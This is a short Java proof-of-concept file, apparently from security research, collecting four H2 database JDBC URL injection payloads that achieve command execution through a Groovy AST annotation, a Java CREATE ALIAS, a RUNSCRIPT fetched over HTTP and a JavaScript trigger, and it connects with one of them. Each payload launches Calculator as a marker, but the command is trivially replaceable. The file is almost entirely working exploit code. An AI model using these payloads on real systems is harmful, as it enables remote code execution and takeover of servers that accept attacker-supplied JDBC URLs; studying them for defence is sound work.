package h2database;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * @author Whoopsunix
 */
public class H2Attack {
    public static void main(String[] args) throws Exception {
        String groovy = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;init=CREATE ALIAS T5 AS '@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")})def x'";

        String offline = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS if not exists EXEC AS 'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;}'\\;CALL EXEC ('open -a calculator.app')\\;";

        String RunScript = "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:1234/poc.sql'";

        String TriggerJS = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")'";

        connect(offline);
    }

    public static void connect(String jdbcUrl) throws Exception{
        Class.forName("org.h2.Driver");
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
